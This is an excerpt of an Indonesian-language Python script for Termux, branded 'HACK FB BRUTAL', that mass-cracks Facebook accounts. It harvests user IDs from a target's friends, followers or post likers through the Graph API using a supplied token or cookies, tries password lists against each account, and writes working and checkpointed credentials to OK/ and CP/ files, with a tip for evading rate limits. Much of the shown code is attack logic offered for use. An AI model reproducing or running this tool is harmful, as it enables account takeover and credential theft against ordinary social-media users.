...
def menu():
      while True:
           print("")
           os.system("clear")
           print('\033[1;36m<===============\033[1;37m{\033[1;34mJANGAN LUPA SEBSCERIBE\033[1;37m}\033[1;36m===============> ')
           print('')
           os.system('date | lolcat')
           print("\033[1;93m")
           print(" \033[1;34m<<<<<<<<<<<<<<<<\033[1;37m{\033[1;36mSELAMAT DATANG\033[1;37m}\033[1;34m>>>>>>>>>>>>>>>>")
           print("\033[1;93m")
           print("\033[1;36m<~~~~~~~~~~~~~~~~~\033[1;37m[\033[1;34mLOGIN MASUK GAN\033[1;37m]\033[1;36m~~~~~~~~~~~~~~~~~>")
           print("")
           try:
                ...
                print ("")
                if x=="ARA" and e=="FIR":
                   print('JANGAN LUPA SUBSCERIBE FIR BODO GAN...')
                   time.sleep(15)
                   os.system('clear')
                   print('')
                   os.system('figlet ' + x + ' | lolcat')
                   time.sleep(2)
                   print('\033[1;92m JANGAN LUPA SUBSCERIBE FIR BODO ')
                   print("")
                   break
                else:
...
def banner():
    print("\n%s         \n%s       %sAuthor: %scyber fir %s& %sWa:085230909752\n%s     %sFB %s: %sFacebook.com/1000xxxx\n%s    %sFB %s: %sCYBER.FIR\n%s   %sGithub %s: %sGithub.com/FIR88\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
...
def menu():
    ...
    try:
        ...
        kadaluarsa = '-'
        pro = ("%s[%s2021%s]"%(O,P,O))
        upgrade = ('DALAM PENGEMBANGAN %s--'%(O))
        jid = ('%s[%s2005%s]'%(O,P,O))
    try:
    ...
    try:
        ...
        ip = " "
    print('%s___[ %sMASA AKTIF SC 3HARI %s %s]'%(O,P,n,O))
    print('%s'%(O))
    print('%s___[%s•%s] %sID : %s'%(O,P,O,P,i))
    print('%s___[%s•%s] %sIP : %s'%(O,P,O,P,ip))
    print('%s'%(O))
    print('%s___[%s•%s] %sStatus : %s'%(O,P,O,P,status))
    print('%s___[%s•%s] %sName : FIR BODO%s'%(O,P,O,P,users))
    print('%s___[%s•%s] %sASKOT:MADURA%s'%(O,P,O,P,maile))
    print('%s___[%s•%s] %sYT :FIR BODO%s'%(O,P,O,P,kunci))
    print('%s___[%s•%s] %sSC :HACK FB BRUTAL%s'%(O,P,O,P,bergabung))
    print('%s___[%s•%s] %sSEMUGA:HARI MU BERUNTUNG%s'%(O,P,O,P,kadaluarsa))
    print('%s___[%s•%s] %s•••••••••••••••••••••••• : %s'%(O,P,O,P,status))
    print('%s'%(O))
    print('%s____[%s1%s] %sCrack AKUN PERTEMANAN TARGET %s'%(O,P,O,P,jid))
    print('%s____[%s2%s] %sCrack AKUN Follower %s'%(O,P,O,P,jid))
    print('%s____[%s3%s] %sCrack AKUN likes post %s'%(O,P,O,P,jid))
    print('%s____[%s4%s] %sInfo Target data'%(O,P,O,P))
    print('%s____[%s5%s] %sCrack CARI ID TARGET VIA TERMUX%s'%(O,P,O,P,pro))
    print('%s____[%s6%s] %sCheck Crack Results'%(O,P,O,P))
    print('%s____[%s7%s] %sCheck priksa hasil %s'%(O,P,O,P,pro))
    print('%s____[%s8%s] %sUser Agent'%(O,P,O,P))
    print('%s____[%s9%s] %s%s'%(O,P,O,P,upgrade))
    print('%s____[%s0%s] %sKELUAR'%(O,P,O,P))
...
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s[%s1%s] %s1%'%(O,P,O,P))
    print('%s[%s2%s] %s5%'%(O,P,O,P))
    print('%s[%s3%s] %s10%'%(O,P,O,P))
    print('%s[%s4%s] %s29%'%(O,P,O,P))
    print('%s[%s5%s] %s30%'%(O,P,O,P))
    print('%s[%s6%s] %s40%'%(O,P,O,P))
    print('%s[%s7%s] %s50%'%(O,P,O,P))
    print('%s[%s8%s] %s100%'%(O,P,O,P))
...
def publik():
    ...
    try:
        ...
        xb.close()
        print('%s[%s•%s] %sTotal ID FB : %s'%(O,P,O,P,len(id)))
        return crack(xc)
...
def pengikut():
    ...
    try:
        print('%s[%s•%s] %sInput ID '%(O,P,O,P))
        it = input("%s[%s•%s] %sID Target bro : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
...
class crack:
    def __init__(self,files):
        ...
        self.ko = 0
        print('%s'%(O))
        print('%s[%s•%s] %smao pakek pw apa gk/Manual [d/m]'%(O,P,O,P))
        while True:
            ...
            if f=="":
                ...
                try:
                    ...
                    print(("   %s"%e))
                    continue
                print('%s[%s•%s] %sFor example : FIRRR,786786,123456'%(O,P,O,P))
                self.pwlist()
                break
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sFIRBODO%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sFIRBODO%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sFIRBODO%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sFIRRR%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sFIRBODO%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sFIRBODO%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sFIRRR%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    ...
                    h_ok = "\r%s[%sDIR BODO%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sFIRRR%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
...
def target():
    ...
    idt = input("%s[%s•%s] %sID Target LU : "%(O,P,O,P))
    try:
    ...
    menu()
def teman_target():
    it = input('%s__[%s•%s] %sID Target FB : '%(O,P,O,P))
    try:
        token = open('token.txt','r').read()
...
def hasil():
    clear()
    banner()
    jalan('%s__[ %sCrack Results %s]'%(O,P,O))
    print('%s'%(O))
    print('%s__[%s1%s] %sCheck Result OK'%(O,P,O,P))
    print('%s__[%s2%s] %sCheck result CP'%(O,P,O,P))
...
def cek_hasil():
    ...
    for memek in buka_baju:
        ...
        print("")
    print("")
    print('%s__[%s•%s] %s Checking Process Complete'%(O,P,O,P))
    print('%s'%(O))
    input('%s__[ %sReturn %s]%s'%(O,P,O,P))
    menu()
def var_menu():
    print('%s__[ %sSELAMAT DATENG DI SC ARA %s]'%(O,P,O))
    print('%s'%(O))
    print('%s__[%s1%s] %sLogin VIA TOKEN'%(O,P,O,P))
    print('%s__[%s2%s] %sLogin VIA Cookies'%(O,P,O,P))
    print('%s__[%s3%s] %sLogin VIA Termux'%(O,P,O,P))
    print('%s__[%s4%s] %sInfo SC '%(O,P,O,P))
    print('%s__[%s0%s] %sKELUAR'%(O,P,O,P))
def var_tutor():
...
def tutor_crack():
    ...
    print('%s║'%(O))
def var_author():
    mlaku('%s╔══[ %sAuthor & CYBER FIR %s]'%(O,P,O))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam CYBER %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    ...
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║     • %sSYG ARA'%(O,P))
    mlaku('%s║     • %sAYG ARA'%(O,P))
    mlaku('%s║     • %sAYG ARA'%(O,P))
    mlaku('%s║     • %sAYG ARA'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %sDapatkan Agen Pengguna"%(O,P,O,P))
    print("%s╠══[%s2%s] %sUbah Agen Pengguna%s(%sManual%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s3%s] %sUbah Agen Pengguna %s(%sAdjust HP%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s4%s] %sHapus Agen Pengguna"%(O,P,O,P))
    print("%s╠══[%s5%s] %sok lanjut"%(O,P,O,P))
    print("%s╠══[%s0%s] %sReturn"%(O,P,O,P))
def start_method():
    print('%s'%(O))
    print('%s__[%s1%s] %sMethod HASIL DIKIT'%(O,P,O,P))
    print('%s__[%s2%s] %sMethod HASIL BANYAK'%(O,P,O,P))
    print('%s__[%s3%s] %sMethod HASIL OK-CP'%(O,P,O,P))
def start_methodezz():
    print('%s'%(O))
    print('%s__[%s1%s] %sCepat Crack %s[%s6 pass%s]'%(O,P,O,P,O,P,O))
    print('%s__[%s2%s] %sSlow Crack %s[%s9 pass%s]'%(O,P,O,P,O,P,O))
    print('%s__[%s3%s] %sVery Slow Crack %s[%s12 pass%s]'%(O,P,O,P,O,P,O))
    print('%s__[%s4%s] %sCrack Password Combine'%(O,P,O,P))
def started():
    print('%s'%(O))
    ...
    print('%s[%s•%s] %sKalo gak ada hasil 5menit idupin mode pesawat 5detik\n'%(O,P,O,P))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
